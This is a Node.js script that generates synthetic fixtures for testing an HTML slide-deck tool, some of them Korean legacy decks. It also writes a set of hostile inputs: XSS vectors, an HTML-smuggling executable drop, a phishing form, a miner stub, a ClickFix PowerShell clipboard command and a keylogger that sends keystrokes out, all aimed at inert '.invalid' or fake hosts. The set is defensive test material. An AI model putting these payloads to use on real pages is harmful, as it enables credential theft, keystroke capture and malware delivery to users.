// Generates the synthetic fixtures. Deterministic output, so diffs in fixtures/ are meaningful.
// These stand in for real files (see docs/phase0/G0-report.md): results must be re-checked on real decks.
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';

const LEGACY = 'fixtures/legacy-html';
const MALICIOUS = 'fixtures/malicious-inputs';
mkdirSync(LEGACY, { recursive: true });
mkdirSync(MALICIOUS, { recursive: true });

const write = (dir, name, content) => writeFileSync(join(dir, name), content);

/** 1x1 PNGs in two colours, so tests can tell pictures apart. */
const PNG_RED =
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==';
const PNG_BLUE =
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPj/HwADBwIAMCbHYQAAAABJRU5ErkJggg==';

/* ---- A: static deck, the common AI-generated shape: section.slide with flex/grid, inline CSS ---- */
const staticSlides = Array.from({ length: 26 }, (_, i) => {
  const n = i + 1;
  if (n === 1) {
    return `<section class="slide cover" data-n="${n}">
    <h1 class="title">2026년 사업 계획 발표</h1>
    <p class="subtitle">전략기획팀 &middot; <b>핵심 요약</b> 포함</p>
  </section>`;
  }
  if (n % 5 === 0) {
    return `<section class="slide" data-n="${n}">
    <h2 class="heading">${n}장: 지표 표</h2>
    <table class="metrics"><thead><tr><th>항목</th><th>값</th></tr></thead>
      <tbody><tr><td>매출</td><td>${n * 12}억</td></tr><tr><td>성장률</td><td>${n}%</td></tr></tbody></table>
  </section>`;
  }
  if (n % 7 === 0) {
    return `<section class="slide two" data-n="${n}">
    <div class="col"><h2 class="heading">${n}장: 사진 설명</h2><p>왼쪽 설명 문장입니다. 사진은 오른쪽에 있습니다.</p></div>
    <div class="col"><img class="photo" src="data:image/png;base64,${PNG_RED}" alt="제품 사진 ${n}"></div>
  </section>`;
  }
  return `<section class="slide" data-n="${n}">
    <h2 class="heading">${n}장: 주요 내용</h2>
    <div class="cards">
      <div class="card"><h3>첫째 항목</h3><p>설명 문장 <em>강조</em> 입니다.</p></div>
      <div class="card accent"><h3>둘째 항목</h3><p>English mixed 문장 ${n}.</p></div>
      <div class="card"><h3>셋째 항목</h3><p>수치는 ${n * 3}% 입니다.</p></div>
    </div>
    <ul class="points"><li>요점 하나</li><li>요점 둘</li></ul>
  </section>`;
}).join('\n  ');

write(
  LEGACY,
  'static-sections.html',
  `<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="utf-8">
<title>2026년 사업 계획</title>
<style>
  * { box-sizing: border-box; }
  body { margin: 0; background: #1e293b; font-family: 'Malgun Gothic', sans-serif; }
  .slide { width: 1280px; height: 720px; padding: 64px; margin: 0 auto 24px; background: linear-gradient(135deg, #ffffff 0%, #eef2ff 100%); color: #0f172a; overflow: hidden; position: relative; }
  .cover { display: flex; flex-direction: column; justify-content: center; align-items: center; background: linear-gradient(135deg, #0f172a, #312e81); color: #f8fafc; }
  .title { font-size: 64px; margin: 0 0 16px; }
  .subtitle { font-size: 28px; margin: 0; color: #c7d2fe; }
  .heading { font-size: 44px; margin: 0 0 32px; color: #1d4ed8; }
  .cards { display: grid; grid-template-columns: repeat(3, 1fr); gap: 24px; }
  .card { padding: 24px; border-radius: 16px; background: #fff; box-shadow: 0 8px 24px rgba(15, 23, 42, .12); }
  .card.accent { background: #2563eb; color: #fff; }
  .card h3 { margin: 0 0 8px; font-size: 26px; }
  .card p { margin: 0; font-size: 20px; }
  .points { margin-top: 32px; font-size: 24px; }
  .two { display: flex; gap: 32px; }
  .col { flex: 1; }
  .photo { width: 100%; height: 480px; object-fit: cover; border-radius: 12px; }
  .metrics { width: 100%; border-collapse: collapse; font-size: 26px; }
  .metrics th, .metrics td { border: 2px solid #94a3b8; padding: 12px; }
  .metrics th { background: #e2e8f0; }
</style>
</head>
<body>
  <!-- 생성 도구가 남긴 주석: 그대로 보존되어야 함 -->
  ${staticSlides}
</body>
</html>
`,
);

/* ---- B: script-driven deck: slides hidden by CSS until .active; navigation, CDN font, canvas chart ---- */
write(
  LEGACY,
  'js-driven.html',
  `<!doctype html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<title>JS 전환 발표</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;700&display=swap">
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<style>
  html, body { margin: 0; height: 100%; background: #000; font-family: 'Noto Sans KR', sans-serif; }
  .deck { position: relative; width: 100vw; height: 100vh; overflow: hidden; }
  .slide { display: none; position: absolute; inset: 0; padding: 80px; flex-direction: column; justify-content: center; background: #0f172a; color: #f1f5f9; animation: fadeIn .6s both; }
  .slide.active { display: flex; }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: none; } }
  h1 { font-size: 72px; margin: 0 0 24px; }
  p { font-size: 32px; margin: 0; }
  .nav { position: fixed; bottom: 16px; right: 24px; color: #94a3b8; }
  canvas { width: 800px !important; height: 400px !important; background: #1e293b; }
</style>
</head>
<body>
<div class="deck">
  <section class="slide active"><h1>첫 슬라이드</h1><p>JS로 넘어가는 발표입니다.</p></section>
  <section class="slide"><h1>둘째 슬라이드</h1><p>화면에 안 보이던 내용도 고칠 수 있어야 합니다.</p></section>
  <section class="slide"><h1>차트 슬라이드</h1><canvas id="chart"></canvas></section>
  <section class="slide"><h1>마지막</h1><p>감사합니다.</p><img src="photo-local.png" alt="없는 사진"></section>
</div>
<div class="nav" id="nav">1 / 4</div>
<script>
  const slides = document.querySelectorAll('.slide');
  let current = 0;
  function show(i) {
    slides.forEach((s, n) => s.classList.toggle('active', n === i));
    document.getElementById('nav').textContent = (i + 1) + ' / ' + slides.length;
  }
  document.addEventListener('keydown', (e) => {
    if (e.key === 'ArrowRight') { current = Math.min(current + 1, slides.length - 1); show(current); }
    if (e.key === 'ArrowLeft') { current = Math.max(current - 1, 0); show(current); }
  });
  new Chart(document.getElementById('chart'), { type: 'bar', data: { labels: ['A', 'B'], datasets: [{ data: [1, 2] }] } });
</script>
</body>
</html>
`,
);

/* ---- C: reveal.js structure ---- */
write(
  LEGACY,
  'reveal-like.html',
  `<!doctype html>
<html><head><meta charset="utf-8"><title>Reveal 구조</title>
<style>
.reveal { width: 960px; height: 540px; } .reveal .slides section { display: none; width: 960px; height: 540px; padding: 40px; box-sizing: border-box; background: #fff; }
.reveal .slides section.present { display: block; } h2 { color: #be123c; font-size: 40px; }
</style></head>
<body><div class="reveal"><div class="slides">
<section class="present"><h2>리빌 첫 장</h2><p>내용 A</p></section>
<section><h2>리빌 둘째 장</h2><p>내용 B <a href="https://example.com/link">링크</a></p></section>
<section data-background="#000"><h2>리빌 셋째 장</h2><p>내용 C</p></section>
</div></div>
<script>/* Reveal.initialize() would run here */</script>
</body></html>
`,
);

/* ---- D: slides built entirely by script: the file has no static content to edit ---- */
write(
  LEGACY,
  'script-rendered.html',
  `<!doctype html>
<html><head><meta charset="utf-8"><title>스크립트 생성</title></head>
<body><div id="app"></div>
<script>
const slides = [{ title: '내용이 스크립트 안에만 있음', body: '정적 분석으로는 슬라이드가 보이지 않습니다.' }, { title: '둘째', body: '본문' }];
const app = document.getElementById('app');
app.innerHTML = slides.map((s) => '<section><h1>' + s.title + '</h1><p>' + s.body + '</p></section>').join('');
${'/* padding so the script is recognised as substantial */\n'.repeat(4)}
</script></body></html>
`,
);

/* ---- E: not a deck ---- */
write(
  LEGACY,
  'plain-webpage.html',
  `<!doctype html>
<html lang="ko"><head><meta charset="utf-8"><title>일반 웹 페이지</title></head>
<body><header><h1>회사 소개</h1></header><main><article><h2>소개</h2><p>스크롤 문서입니다.</p></article></main><footer>끝</footer></body></html>
`,
);

/* ---- F: legacy bytes: EUC-KR, CRLF, unquoted attributes, uppercase tags, picture and inline background ---- */
{
  const text = `<HTML>\r\n<HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=euc-kr"><TITLE>옛날 문서</TITLE>\r\n<STYLE>.slide{width:800px;height:600px;background:#fff}</STYLE></HEAD>\r\n<BODY>\r\n<DIV CLASS=slide><H1>옛날 제목</H1><P>옛날 본문</P></DIV>\r\n<DIV CLASS=slide><H1>둘째 제목</H1><DIV STYLE="height:200px;background:url(data:image/png;base64,${PNG_BLUE})">배경 사진</DIV></DIV>\r\n</BODY></HTML>\r\n`;
  // Node has no EUC-KR encoder, so bytes are built from a small map of the characters used here.
  const euc = new TextDecoder('euc-kr');
  const table = new Map();
  for (let hi = 0xb0; hi <= 0xc8; hi++) {
    for (let lo = 0xa1; lo <= 0xfe; lo++) {
      const ch = euc.decode(new Uint8Array([hi, lo]));
      if (ch.length === 1) table.set(ch, [hi, lo]);
    }
  }
  const bytes = [];
  for (const ch of text) {
    if (ch.charCodeAt(0) < 128) bytes.push(ch.charCodeAt(0));
    else {
      const pair = table.get(ch);
      if (!pair) throw new Error(`no EUC-KR mapping for ${ch}`);
      bytes.push(...pair);
    }
  }
  write(LEGACY, 'legacy-euckr.html', new Uint8Array(bytes));
}

/* ---- Hostile inputs. All payloads are inert: invalid hosts (.invalid), no working malware. ---- */
const peStub = () => {
  const b = new Uint8Array(512);
  b.set([0x4d, 0x5a]);
  b[60] = 128;
  b.set([0x50, 0x45, 0, 0], 128);
  return Buffer.from(b).toString('base64');
};

write(
  MALICIOUS,
  'xss-everywhere.html',
  `<!doctype html><html><head><title>악성</title>
<base href="https://evil.invalid/">
<meta http-equiv="refresh" content="0;url=https://evil.invalid/redirect">
<link rel="stylesheet" href="https://evil.invalid/x.css">
<style>body{background:url(https://evil.invalid/css-beacon.png)} @import url("https://evil.invalid/import.css");</style>
<script>top.__pwned = 'head-script'; parent.__pwned = 'head-script'; fetch('https://evil.invalid/fetch');</script>
<script src="https://evil.invalid/x.js"></script>
</head><body onload="top.__pwned='body-onload'">
<section class="slide"><h1 onclick="top.__pwned='h1-click'">클릭 공격 제목</h1>
<img src="x" onerror="top.__pwned='img-onerror'">
<img src="https://evil.invalid/pixel.gif">
<svg onload="top.__pwned='svg-onload'"><script>top.__pwned='svg-script'</script><a href="javascript:top.__pwned='svg-link'"><text y="20">링크</text></a></svg>
<a href="javascript:top.__pwned='link'" id="jslink">자바스크립트 링크</a>
<iframe srcdoc="<script>top.__pwned='srcdoc'</script>"></iframe>
<iframe src="https://evil.invalid/frame" width="0" height="0"></iframe>
<object data="https://evil.invalid/x.swf"></object><embed src="https://evil.invalid/y">
<form action="https://evil.invalid/steal"><input name="q" autofocus onfocus="top.__pwned='autofocus'"><button formaction="javascript:top.__pwned='formaction'">전송</button></form>
<video src="https://evil.invalid/v.mp4" autoplay onplay="top.__pwned='video'"></video>
<div style="background:url('https://evil.invalid/inline-beacon.png')">배경 비컨</div>
</section><section class="slide"><h1>둘째 장</h1></section>
<script>top.__pwned='body-script'</script></body></html>
`,
);

write(
  MALICIOUS,
  'html-smuggling.html',
  `<!doctype html><html><body><section class="slide"><h1>청구서 확인</h1></section>
<script>
const data = atob("${peStub()}");
const bytes = new Uint8Array(data.length);
for (let i = 0; i < data.length; i++) bytes[i] = data.charCodeAt(i);
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([bytes]));
a.download = 'invoice.exe';
a.click();
</script></body></html>
`,
);

write(
  MALICIOUS,
  'phishing-form.html',
  `<!doctype html><html><body><section class="slide"><h1>로그인이 필요합니다</h1>
<form action="https://login.evil.invalid/capture" method="post"><input name="id"><input type="password" name="pw"><button>확인</button></form>
</section></body></html>
`,
);

write(
  MALICIOUS,
  'obfuscated-miner.html',
  `<!doctype html><html><body><section class="slide"><h1>슬라이드</h1></section>
<script>eval(function(p,a,c,k,e,d){return p}('0',1,1,''.split('|'),0,{}));</script>
<script>var miner = new CoinHive.Anonymous('SITE_KEY'); miner.start();</script></body></html>
`,
);

write(
  MALICIOUS,
  'clickfix.html',
  `<!doctype html><html><body><section class="slide"><h1>로봇이 아닙니다 확인</h1><p>Win + R 을 누른 뒤 Ctrl + V 후 Enter</p></section>
<script>navigator.clipboard.writeText("powershell -w hidden -enc AAAA");</script></body></html>
`,
);

write(
  MALICIOUS,
  'keylogger.html',
  `<!doctype html><html><body><section class="slide"><h1>슬라이드</h1></section>
<script>let k='';document.addEventListener('keydown',e=>{k+=e.key;fetch('https://api.telegram.org/bot000:fake/sendMessage?text='+k)});</script></body></html>
`,
);

write(
  MALICIOUS,
  'native-tampered.html',
  `<!doctype html><html><head><meta name="hps-format" content="2;editable"><title>위조</title></head>
<body><script type="application/json" id="hps-document">{"formatVersion":2,"docId":"x","meta":{"title":"위조"},"page":{},"theme":{},"slides":[{"id":"s","background":{"type":"solid","color":"#fff"},"elements":[{"id":"e","type":"html","frame":{"x":0,"y":0,"w":1,"h":1},"html":"\\u003cscript\\u003etop.__pwned='native'\\u003c/script\\u003e"}]}]}</script>
<script>top.__pwned='native-script'</script></body></html>
`,
);

write(MALICIOUS, 'exe-renamed.html', Buffer.from(peStub(), 'base64'));

console.log('fixtures written');
